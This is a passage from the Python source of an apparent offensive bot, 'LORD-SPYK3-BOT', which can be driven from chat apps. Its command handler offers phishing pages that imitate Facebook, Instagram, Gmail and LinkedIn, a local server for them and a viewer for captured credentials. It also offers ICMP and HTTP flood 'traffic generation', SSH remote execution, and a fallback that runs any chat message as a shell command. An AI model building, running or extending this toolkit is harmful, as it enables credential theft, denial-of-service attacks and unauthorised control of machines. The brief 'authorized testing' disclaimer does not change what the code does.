        """Load Slack configuration"""
        try:
            if os.path.exists(SLACK_CONFIG_FILE):
                with open(SLACK_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", prefix: str = "!", enabled: bool = True) -> bool:
        """Save Slack configuration"""
        try:
            config = {
                'enabled': enabled,
                'bot_token': bot_token,
                'channel_id': channel_id,
                'prefix': prefix
            }
            with open(SLACK_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Slack config: {e}")
            return False
    
    def start(self):
        """Start Slack bot"""
        if not SLACK_AVAILABLE:
            return False
        
        if not self.config.get('bot_token'):
            return False
        
        print(f"{Colors.YELLOW}⚠️ Slack bot requires configuration. Use 'start_slack' command to start.{Colors.RESET}")
        return True
    
    def start_bot_thread(self) -> bool:
        """Start Slack bot in thread"""
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# IMESSAGE BOT
# =====================
class IMessageBot:
    """iMessage bot integration (macOS only)"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self._load_config()
        self.running = False
    
    def _load_config(self) -> Dict:
        """Load iMessage configuration"""
        try:
            if os.path.exists(IMESSAGE_CONFIG_FILE):
                with open(IMESSAGE_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str], prefix: str = "!", enabled: bool = True) -> bool:
        """Save iMessage configuration"""
        try:
            config = {
                'enabled': enabled,
                'phone_numbers': phone_numbers,
                'prefix': prefix
            }
            with open(IMESSAGE_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save iMessage config: {e}")
            return False
    
    def start(self):
        """Start iMessage bot"""
        if not IMESSAGE_AVAILABLE:
            return False
        
        print(f"{Colors.YELLOW}⚠️ iMessage bot requires macOS with Messages app. Use 'start_imessage' command to start.{Colors.RESET}")
        return True
    
    def start_bot_thread(self) -> bool:
        """Start iMessage bot in thread"""
        if self.config.get('enabled') and self.config.get('phone_numbers'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Unified command handler for all commands"""
    
    def __init__(self, db: DatabaseManager, executor: CommandExecutor,
                 ssh_manager: SSHManager, shodan_manager: ShodanManager,
                 hunter_manager: HunterManager, nikto_scanner: NiktoScanner,
                 traffic_gen: TrafficGenerator, social_tools: SocialEngineeringTools,
                 time_manager: TimeManager, monitor: NetworkMonitor):
        self.db = db
        self.executor = executor
        self.ssh = ssh_manager
        self.shodan = shodan_manager
        self.hunter = hunter_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_gen
        self.social = social_tools
        self.time_manager = time_manager
        self.monitor = monitor
        self.network = NetworkTools()
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Built-in commands
        if cmd in ['time', '!time']:
            result = self._handle_time(args)
        elif cmd in ['date', '!date']:
            result = self._handle_date(args)
        elif cmd in ['datetime', 'now']:
            result = self._handle_datetime(args)
        elif cmd == 'history':
            result = self._handle_history(args)
        elif cmd == 'time_history':
            result = self._handle_time_history(args)
        elif cmd == 'help':
            result = self._handle_help()
        elif cmd == 'status':
            result = self._handle_status()
        elif cmd == 'threats':
            result = self._handle_threats(args)
        elif cmd == 'report':
            result = self._handle_report()
        
        # SSH commands
        elif cmd == 'ssh':
            result = self._handle_ssh(args)
        elif cmd == 'ssh_list':
            result = self._handle_ssh_list()
        elif cmd == 'ssh_add':
            result = self._handle_ssh_add(args)
        elif cmd == 'ssh_connect':
            result = self._handle_ssh_connect(args)
        elif cmd == 'ssh_disconnect':
            result = self._handle_ssh_disconnect(args)
        elif cmd == 'ssh_execute':
            result = self._handle_ssh_execute(args)
        elif cmd == 'ssh_upload':
            result = self._handle_ssh_upload(args)
        elif cmd == 'ssh_download':
            result = self._handle_ssh_download(args)
        
        # Shodan commands
        elif cmd == 'shodan':
            result = self._handle_shodan(args)
        elif cmd == 'shodan_ip':
            result = self._handle_shodan_ip(args)
        elif cmd == 'shodan_search':
            result = self._handle_shodan_search(args)
        elif cmd == 'shodan_count':
            result = self._handle_shodan_count(args)
        elif cmd == 'shodan_stats':
            result = self._handle_shodan_stats()
        
        # Hunter.io commands
        elif cmd == 'hunter':
            result = self._handle_hunter(args)
        elif cmd == 'hunter_domain':
            result = self._handle_hunter_domain(args)
        elif cmd == 'hunter_verify':
            result = self._handle_hunter_verify(args)
        elif cmd == 'hunter_finder':
            result = self._handle_hunter_finder(args)
        elif cmd == 'hunter_stats':
            result = self._handle_hunter_stats()
        
        # Nikto commands
        elif cmd == 'nikto':
            result = self._handle_nikto(args)
        
        # Traffic generation commands
        elif cmd == 'generate_traffic':
            result = self._handle_generate_traffic(args)
        elif cmd == 'traffic_types':
            result = self._handle_traffic_types()
        elif cmd == 'traffic_status':
            result = self._handle_traffic_status()
        elif cmd == 'traffic_stop':
            result = self._handle_traffic_stop(args)
        elif cmd == 'traffic_help':
            result = self._handle_traffic_help()
        
        # Phishing commands
        elif cmd == 'generate_phishing_link_for_facebook':
            result = self._handle_phishing_generate(['facebook'])
        elif cmd == 'generate_phishing_link_for_instagram':
            result = self._handle_phishing_generate(['instagram'])
        elif cmd == 'generate_phishing_link_for_twitter':
            result = self._handle_phishing_generate(['twitter'])
        elif cmd == 'generate_phishing_link_for_gmail':
            result = self._handle_phishing_generate(['gmail'])
        elif cmd == 'generate_phishing_link_for_linkedin':
            result = self._handle_phishing_generate(['linkedin'])
        elif cmd == 'generate_phishing_link_for_custom':
            result = self._handle_phishing_generate(args)
        elif cmd == 'phishing_start_server':
            result = self._handle_phishing_start(args)
        elif cmd == 'phishing_stop_server':
            result = self._handle_phishing_stop()
        elif cmd == 'phishing_status':
            result = self._handle_phishing_status()
        elif cmd == 'phishing_links':
            result = self._handle_phishing_links()
        elif cmd == 'phishing_credentials':
            result = self._handle_phishing_credentials(args)
        elif cmd == 'phishing_qr':
            result = self._handle_phishing_qr(args)
        elif cmd == 'phishing_shorten':
            result = self._handle_phishing_shorten(args)
        
        # IP management commands
        elif cmd == 'add_ip':
            result = self._handle_add_ip(args)
        elif cmd == 'remove_ip':
            result = self._handle_remove_ip(args)
        elif cmd == 'block_ip':
            result = self._handle_block_ip(args)
        elif cmd == 'unblock_ip':
            result = self._handle_unblock_ip(args)
        elif cmd == 'list_ips':
            result = self._handle_list_ips(args)
        elif cmd == 'ip_info':
            result = self._handle_ip_info(args)
        
        # Network diagnostic commands
        elif cmd == 'ping':
            result = self._handle_ping(args)
        elif cmd == 'traceroute':
            result = self._handle_traceroute(args)
        elif cmd == 'nmap':
            result = self._handle_nmap(args)
        elif cmd == 'curl':
            result = self._handle_curl(args)
        elif cmd == 'wget':
            result = self._handle_wget(args)
        elif cmd == 'nc':
            result = self._handle_nc(args)
        elif cmd == 'whois':
            result = self._handle_whois(args)
        elif cmd == 'dns':
            result = self._handle_dns(args)
        elif cmd == 'location':
            result = self._handle_location(args)
        
        # System commands
        elif cmd == 'system':
            result = self._handle_system()
        
        # Bot start commands
        elif cmd == 'start_discord':
            result = self._handle_start_discord()
        elif cmd == 'start_telegram':
            result = self._handle_start_telegram()
        elif cmd == 'start_whatsapp':
            result = self._handle_start_whatsapp()
        elif cmd == 'start_signal':
            result = self._handle_start_signal()
        elif cmd == 'start_slack':
            result = self._handle_start_slack()
        elif cmd == 'start_imessage':
            result = self._handle_start_imessage()
        
        else:
            # Try external command
            result = self.executor.execute(command, source)
            
            # If not handled by executor, try generic execution
            if not result.get('success') and not result.get('handled'):
                try:
                    proc_result = subprocess.run(command, shell=True, capture_output=True,
                                                text=True, timeout=60)
                    result = {
                        'success': proc_result.returncode == 0,
                        'output': proc_result.stdout if proc_result.stdout else proc_result.stderr
                    }
                except Exception as e:
                    result = {'success': False, 'output': str(e)}
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        return result
    
    # ==================== Built-in Command Handlers ====================
    def _handle_time(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        output = self.time_manager.get_current_time(full)
        self.db.log_time_command('time', 'local', output[:100])
        return {'success': True, 'output': output}
    
    def _handle_date(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        output = self.time_manager.get_current_date(full)
        self.db.log_time_command('date', 'local', output[:100])
        return {'success': True, 'output': output}
    
    def _handle_datetime(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        output = self.time_manager.get_datetime(full)
        self.db.log_time_command('datetime', 'local', output[:100])
        return {'success': True, 'output': output}
    
    def _handle_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': 'No command history found'}
        
        output = f"📜 Command History (Last {len(history)}):\n"
        output += "─" * 50 + "\n"
        for i, cmd in enumerate(history, 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _handle_time_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_time_history(limit)
        if not history:
            return {'success': True, 'output': 'No time command history found'}
        
        output = f"⏰ Time Command History (Last {len(history)}):\n"
        output += "─" * 50 + "\n"
        for i, cmd in enumerate(history, 1):
            output += f"{i:2d}. [{cmd['timestamp'][:19]}] {cmd['command']}\n"
            if cmd['result']:
                output += f"     → {cmd['result'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _handle_help(self) -> Dict[str, Any]:
        help_text = """
🕷️ LORD-SPYK3-BOT v1.0.0 - Help Menu
=====================================

📡 NMAP COMMANDS:
  !nmap -sP 192.168.1.0/24     - Ping sweep
  !nmap -sS 192.168.1.1        - SYN scan
  !nmap -sV 192.168.1.1        - Version detection
  !nmap -O 192.168.1.1         - OS detection
  !nmap -A 192.168.1.1         - Aggressive scan
  !nmap -p- 192.168.1.1        - All ports
  !nmap --script vuln 192.168.1.1 - Vulnerability scan

🌐 CURL COMMANDS:
  !curl http://example.com           - GET request
  !curl -X POST -d "data=value"      - POST request
  !curl -H "Header: value"           - Custom headers
  !curl -O http://example.com/file   - Download file

📥 WGET COMMANDS:
  !wget http://example.com/file      - Download file
  !wget -O output.html http://...    - Save with name
  !wget -r -l 5 http://...           - Recursive download

🔌 NETCAT COMMANDS:
  !nc example.com 80                 - Connect to port
  !nc -l -p 1234                     - Listen on port
  !nc -zv 192.168.1.1 1-1000         - Port scan

🔐 SSH COMMANDS:
  !ssh user@hostname                 - SSH connection
  !ssh -p 2222 user@hostname         - Custom port
  !ssh -L 8080:localhost:80 user@... - Port forwarding

🔍 SHODAN COMMANDS:
  !shodan_ip 8.8.8.8                 - IP lookup
  !shodan_search apache              - Search Shodan
  !shodan_count port:22              - Count results

📧 HUNTER.IO COMMANDS:
  !hunter_domain example.com         - Find emails
  !hunter_verify email@domain.com    - Verify email
  !hunter_finder domain first last   - Find specific email

🚀 TRAFFIC GENERATION:
  !generate_traffic icmp 8.8.8.8 10     - ICMP flood
  !generate_traffic http_get 192.168.1.1 30 80 - HTTP GET
  !traffic_status                       - Active generators
  !traffic_stop [id]                    - Stop generation

🎣 PHISHING:
  !generate_phishing_link_for_facebook  - Facebook page
  !generate_phishing_link_for_instagram - Instagram page
  !phishing_start_server <id> 8080      - Start server
  !phishing_credentials                 - View captured data

🔒 IP MANAGEMENT:
  !add_ip 192.168.1.100 [notes]         - Add IP to monitoring
  !block_ip 10.0.0.5 "Reason"           - Block IP
  !list_ips                             - List managed IPs
  !ip_info 8.8.8.8                      - IP information

⏰ TIME COMMANDS:
  !time              - Current time
  !date              - Current date
  !datetime          - Both
  !history           - Command history

📊 SYSTEM COMMANDS:
  !status            - System status
  !threats           - Recent threats
  !report            - Security report

🤖 BOT COMMANDS:
  !start_discord     - Start Discord bot
  !start_telegram    - Start Telegram bot
  !start_whatsapp    - Start WhatsApp bot
  !start_signal      - Start Signal bot
  !start_slack       - Start Slack bot
  !start_imessage    - Start iMessage bot

⚠️ For authorized security testing only
        """
        return {'success': True, 'output': help_text}
    
    def _handle_status(self) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        monitor_status = self.monitor.get_status()
        
        output = f"""
📊 System Status
=====================================

Session ID: {self.db.create_session('local')}
Active Sessions: {stats.get('active_sessions', 0)}
Total Commands: {stats.get('total_commands', 0)}
Time Commands: {stats.get('total_time_commands', 0)}
Total Threats: {stats.get('total_threats', 0)}
Total Scans: {stats.get('total_scans', 0)}
Nikto Scans: {stats.get('total_nikto_scans', 0)}
Shodan Scans: {stats.get('total_shodan_scans', 0)}
Hunter Scans: {stats.get('total_hunter_scans', 0)}
Traffic Tests: {stats.get('total_traffic_tests', 0)}
Managed IPs: {stats.get('total_managed_ips', 0)}
Blocked IPs: {stats.get('total_blocked_ips', 0)}
Phishing Links: {stats.get('active_phishing_links', 0)}
Captured Credentials: {stats.get('captured_credentials', 0)}

📡 Monitoring Status:
  Active: {'✅' if monitor_status['monitoring'] else '❌'}
  Monitored IPs: {monitor_status['monitored_ips_count']}
  Active Connections: {monitor_status['active_connections']}
  Auto-block: {'✅' if monitor_status['auto_block'] else '❌'}

🔐 SSH Status:
  SSH Available: {'✅' if self.ssh.is_available() else '❌'}
  Active Connections: {len(self.ssh.get_status().get('connections', []))}
  Configured Connections: {len(self.ssh.get_all_connections())}
"""
        return {'success': True, 'output': output}
    
    def _handle_threats(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': '✅ No recent threats detected'}
        
        output = "🚨 Recent Threats:\n\n"
        for threat in threats:
            output += f"[{threat['timestamp'][:19]}] {threat['threat_type']}\n"
            output += f"  Source: {threat['source_ip']}\n"
            output += f"  Severity: {threat['severity'].upper()}\n"
            output += f"  Description: {threat['description']}\n\n"
        
        return {'success': True, 'output': output}
    
    def _handle_report(self) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(50)
        scans = self.db.get_nikto_scans(5)
        
        critical = len([t for t in threats if t.get('severity') == 'critical'])
        high = len([t for t in threats if t.get('severity') == 'high'])
        medium = len([t for t in threats if t.get('severity') == 'medium'])
        low = len([t for t in threats if t.get('severity') == 'low'])
        
        output = f"""
📊 Security Report
Generated: {datetime.datetime.now().isoformat()}
=====================================

📈 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Total Scans: {stats.get('total_scans', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('total_blocked_ips', 0)}
  Phishing Links: {stats.get('active_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}

🚨 Threat Summary:
  Critical: {critical}
  High: {high}
  Medium: {medium}
  Low: {low}

📊 Recent Nikto Scans:
"""
        for scan in scans[:3]:
            output += f"  • {scan.get('target', 'Unknown')} - {scan.get('timestamp', '')[:19]}\n"

        return {'success': True, 'output': output}
    
    # ==================== SSH Command Handlers ====================
    def _handle_ssh(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._handle_ssh_list()
        return self._handle_ssh_connect(args)
    
    def _handle_ssh_list(self) -> Dict[str, Any]:
        connections = self.ssh.get_all_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        
        output = "🔐 Configured SSH Connections:\n\n"
        for conn in connections:
            status = "🟢 Connected" if conn['status'] == 'connected' else "⚪ Disconnected"
            output += f"  {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']}) - {status}\n"
        
        active = self.ssh.get_status()
        if active.get('active_connections', 0) > 0:
            output += f"\nActive Connections: {active['active_connections']}"
        
        return {'success': True, 'output': output}
    
    def _handle_ssh_add(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password] [port]'}
        
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 else 22
        
        conn_id = str(uuid.uuid4())[:8]
        
        if self.db.save_ssh_connection(conn_id, name, host, port, username, password):
            return {'success': True, 'output': f"✅ SSH connection '{name}' added successfully (ID: {conn_id})"}
        else:
            return {'success': False, 'output': 'Failed to add SSH connection'}
    
    def _handle_ssh_connect(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <name_or_id>'}
        
        name_or_id = args[0]
        
        # Try to find by name first
        conn = self.db.get_ssh_connection_by_name(name_or_id)
        if not conn:
            conn = self.db.get_ssh_connection(name_or_id)
        
        if not conn:
            return {'success': False, 'output': f"SSH connection '{name_or_id}' not found"}
        
        result = self.ssh.connect(
            conn['id'], conn['host'], conn['username'],
            conn['port'], conn.get('password'), conn.get('key_path')
        )
        
        if result['success']:
            return {'success': True, 'output': f"✅ Connected to {conn['host']} as {conn['username']}"}
        else:
            return {'success': False, 'output': f"❌ Connection failed: {result.get('error', 'Unknown error')}"}
    
    def _handle_ssh_disconnect(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_disconnect <name_or_id>'}
        
        name_or_id = args[0]
        
        conn = self.db.get_ssh_connection_by_name(name_or_id)
        if not conn:
            conn = self.db.get_ssh_connection(name_or_id)
        
        if not conn:
            return {'success': False, 'output': f"SSH connection '{name_or_id}' not found"}
        
        self.ssh.disconnect(conn['id'])
        return {'success': True, 'output': f"Disconnected from {conn['host']}"}
    
    def _handle_ssh_execute(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_execute <name_or_id> <command>'}
        
        name_or_id = args[0]
        command = ' '.join(args[1:])
        
        conn = self.db.get_ssh_connection_by_name(name_or_id)
        if not conn:
            conn = self.db.get_ssh_connection(name_or_id)
        
        if not conn:
            return {'success': False, 'output': f"SSH connection '{name_or_id}' not found"}
        
        # Check if connected
        status = self.ssh.get_status(conn['id'])
        if not status.get('connected'):
            result = self.ssh.connect(conn['id'], conn['host'], conn['username'],
                                     conn['port'], conn.get('password'), conn.get('key_path'))
            if not result['success']:
                return {'success': False, 'output': f"Not connected: {result.get('error', 'Unknown error')}"}
        
        result = self.ssh.execute_command(conn['id'], command)
        return {'success': result['success'], 'output': result.get('output', result.get('error', ''))}
    
    def _handle_ssh_upload(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_upload <name_or_id> <local_path> <remote_path>'}
        
        name_or_id = args[0]
        local_path = args[1]
        remote_path = args[2]
        
        conn = self.db.get_ssh_connection_by_name(name_or_id)
        if not conn:
            conn = self.db.get_ssh_connection(name_or_id)
        
        if not conn:
            return {'success': False, 'output': f"SSH connection '{name_or_id}' not found"}
        
        # Check if connected
        status = self.ssh.get_status(conn['id'])
        if not status.get('connected'):
            result = self.ssh.connect(conn['id'], conn['host'], conn['username'],
                                     conn['port'], conn.get('password'), conn.get('key_path'))
            if not result['success']:
                return {'success': False, 'output': f"Not connected: {result.get('error', 'Unknown error')}"}
        
        result = self.ssh.upload_file(conn['id'], local_path, remote_path)
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    def _handle_ssh_download(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_download <name_or_id> <remote_path> <local_path>'}
        
        name_or_id = args[0]
        remote_path = args[1]
        local_path = args[2]
        
        conn = self.db.get_ssh_connection_by_name(name_or_id)
        if not conn:
            conn = self.db.get_ssh_connection(name_or_id)
        
        if not conn:
            return {'success': False, 'output': f"SSH connection '{name_or_id}' not found"}
        
        # Check if connected
        status = self.ssh.get_status(conn['id'])
        if not status.get('connected'):
            result = self.ssh.connect(conn['id'], conn['host'], conn['username'],
                                     conn['port'], conn.get('password'), conn.get('key_path'))
            if not result['success']:
                return {'success': False, 'output': f"Not connected: {result.get('error', 'Unknown error')}"}
        
        result = self.ssh.download_file(conn['id'], remote_path, local_path)
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    # ==================== Shodan Command Handlers ====================
    def _handle_shodan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._handle_shodan_stats()
        if args[0] == 'ip' and len(args) > 1:
            return self._handle_shodan_ip([args[1]])
        elif args[0] == 'search':
            return self._handle_shodan_search([' '.join(args[1:])])
        elif args[0] == 'count':
            return self._handle_shodan_count([' '.join(args[1:])])
        return self._handle_shodan_stats()
    
    def _handle_shodan_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: shodan_ip <ip>'}
        
        result = self.shodan.search_ip(args[0])
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Shodan lookup failed')}
        
        data = result
        output = f"""
🔍 Shodan Results for {data['ip']}
=====================================

📍 Location: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}
🏢 Organization: {data.get('org', 'Unknown')}
💻 OS: {data.get('os', 'Unknown')}

🔌 Open Ports:
"""
        for port in data.get('ports', [])[:20]:
            output += f"  • {port}\n"
        
        if data.get('vulnerabilities'):
            output += "\n⚠️ Vulnerabilities:\n"
            for vuln in data['vulnerabilities'][:10]:
                output += f"  • {vuln}\n"
        
        return {'success': True, 'output': output}
    
    def _handle_shodan_search(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: shodan_search <query>'}
        
        result = self.shodan.search(args[0])
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Shodan search failed')}
        
        output = f"""
🔍 Shodan Search Results for: {result['query']}
=====================================

Total Results: {result['total']}

Top Results:
"""
        for res in result.get('results', [])[:10]:
            ip = res.get('ip_str', 'Unknown')
            port = res.get('port', 'Unknown')
            hostname = res.get('hostnames', ['Unknown'])[0]
            output += f"  • {ip}:{port} - {hostname}\n"
        
        return {'success': True, 'output': output}
    
    def _handle_shodan_count(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: shodan_count <query>'}
        
        result = self.shodan.count(args[0])
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Shodan count failed')}
        
        return {'success': True, 'output': f"Query '{args[0]}' found {result.get('total', 0)} results"}
    
    def _handle_shodan_stats(self) -> Dict[str, Any]:
        stats = self.shodan.get_stats()
        if not stats.get('available'):
            return {'success': False, 'output': 'Shodan not configured'}
        
        output = f"""
📊 Shodan Statistics
=====================================

Scan Credits: {stats.get('scan_credits', 0)}
Query Credits: {stats.get('query_credits', 0)}
Monitored IPs: {stats.get('monitored_ips', 0)}
"""
        return {'success': True, 'output': output}
    
    # ==================== Hunter.io Command Handlers ====================
    def _handle_hunter(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._handle_hunter_stats()
        if args[0] == 'domain' and len(args) > 1:
            return self._handle_hunter_domain([args[1]])
        elif args[0] == 'verify' and len(args) > 1:
            return self._handle_hunter_verify([args[1]])
        elif args[0] == 'finder' and len(args) > 3:
            return self._handle_hunter_finder(args[1:])
        return self._handle_hunter_stats()
    
    def _handle_hunter_domain(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: hunter_domain <domain>'}
        
        result = self.hunter.domain_search(args[0])
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Hunter.io search failed')}
        
        output = f"""
📧 Hunter.io Results for {result['domain']}
=====================================

Total Emails Found: {result.get('total', 0)}
Pattern: {result.get('pattern', 'Unknown')}
Organization: {result.get('organization', 'Unknown')}

Emails:
"""
        for email in result.get('emails', [])[:10]:
            value = email.get('value', 'Unknown')
            confidence = email.get('confidence', 0)
            output += f"  • {value} (Confidence: {confidence}%)\n"
        
        return {'success': True, 'output': output}
    
    def _handle_hunter_verify(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: hunter_verify <email>'}
        
        result = self.hunter.email_verifier(args[0])
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Hunter.io verification failed')}
        
        status = result.get('status', 'unknown')
        status_emoji = "✅" if status == 'valid' else "❌" if status == 'invalid' else "⚠️"
        
        output = f"""
📧 Email Verification: {args[0]}
=====================================

Status: {status_emoji} {status.upper()}
MX Records: {'✅ Yes' if result.get('mx_records') else '❌ No'}
SMTP Check: {result.get('smtp_check', 'N/A')}
"""
        return {'success': True, 'output': output}
    
    def _handle_hunter_finder(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: hunter_finder <domain> <first_name> <last_name>'}
        
        domain = args[0]
        first_name = args[1]
        last_name = args[2]
        
        result = self.hunter.email_finder(domain, first_name, last_name)
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Hunter.io finder failed')}
        
        output = f"""
📧 Email Finder: {first_name} {last_name} @ {domain}
=====================================

Email: {result.get('email', 'Not found')}
Confidence: {result.get('confidence', 0)}%
Pattern: {result.get('pattern', 'Unknown')}
"""
        return {'success': True, 'output': output}
    
    def _handle_hunter_stats(self) -> Dict[str, Any]:
        stats = self.hunter.get_stats()
        if not stats.get('available'):
            return {'success': False, 'output': 'Hunter.io not configured'}
        
        output = f"""
📊 Hunter.io Statistics
=====================================

Requests Left: {stats.get('requests_left', 0)}
Plan: {stats.get('plan', 'Unknown')}
Reset Date: {stats.get('reset_date', 'N/A')}
"""
        return {'success': True, 'output': output}
    
    # ==================== Nikto Command Handlers ====================
    def _handle_nikto(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target> [options]'}
        
        target = args[0]
        options = {}
        
        for i in range(1, len(args)):
            if args[i] == '-ssl':
                options['ssl'] = True
            elif args[i] == '-port' and i + 1 < len(args):
                options['port'] = args[i + 1]
        
        result = self.nikto.scan(target, options)
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Nikto scan failed')}
        
        output = f"""
🕷️ Nikto Scan Results for {target}
=====================================

Scan Time: {result.get('scan_time', 0):.2f}s
Vulnerabilities Found: {result.get('count', 0)}

Vulnerabilities:
"""
        for vuln in result.get('vulnerabilities', [])[:20]:
            desc = vuln.get('description', '')[:100]
            output += f"  • {desc}\n"
        
        return {'success': True, 'output': output}
    
    # ==================== Traffic Generation Handlers ====================
    def _handle_generate_traffic(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: generate_traffic <type> <ip> <duration> [port]'}
        
        traffic_type = args[0].lower()
        target_ip = args[1]
        
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        
        port = int(args[3]) if len(args) > 3 else None
        
        result = self.traffic_gen.generate(traffic_type, target_ip, duration, port)
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    def _handle_traffic_types(self) -> Dict[str, Any]:
        types = self.traffic_gen.get_available_types()
        output = "📡 Available Traffic Types:\n\n"
        for t in types:
            output += f"  • {t}\n"
        output += "\nUse 'traffic_help' for detailed usage"
        return {'success': True, 'output': output}
    
    def _handle_traffic_status(self) -> Dict[str, Any]:
        active = self.traffic_gen.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        
        output = "🚀 Active Traffic Generators:\n\n"
        for gen in active:
            output += f"  • {gen['type']} -> {gen['target_ip']}:{gen['target_port']} "
            output += f"({gen['packets_sent']} packets, {gen['status']})\n"
        
        return {'success': True, 'output': output}
    
    def _handle_traffic_stop(self, args: List[str]) -> Dict[str, Any]:
        generator_id = args[0] if args else None
        if self.traffic_gen.stop(generator_id):
            if generator_id:
                return {'success': True, 'output': f"Stopped generator {generator_id}"}
            else:
                return {'success': True, 'output': "Stopped all generators"}
        else:
            return {'success': False, 'output': "No generators found"}
    
    def _handle_traffic_help(self) -> Dict[str, Any]:
        return {'success': True, 'output': self.traffic_gen.get_types_help()}
    
    # ==================== Phishing Handlers ====================
    def _handle_phishing_generate(self, args: List[str]) -> Dict[str, Any]:
        platform = args[0] if args else 'custom'
        custom_url = args[1] if len(args) > 1 else None
        
        result = self.social.generate_phishing_link(platform, custom_url)
        if not result['success']:
            return {'success': False, 'output': result.get('error', 'Failed to generate link')}
        
        output = f"""
🎣 Phishing Link Generated
=====================================

Platform: {result['platform']}
Link ID: {result['link_id']}
Phishing URL: {result['phishing_url']}

To start server: phishing_start_server {result['link_id']} 8080
"""
        return {'success': True, 'output': output}
    
    def _handle_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start_server <link_id> [port]'}
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        if self.social.start_phishing_server(link_id, port):
            url = self.social.get_server_url()
            return {'success': True, 'output': f"✅ Phishing server started on {url}"}
        else:
            return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _handle_phishing_stop(self) -> Dict[str, Any]:
        self.social.stop_phishing_server()
        return {'success': True, 'output': "Phishing server stopped"}
    
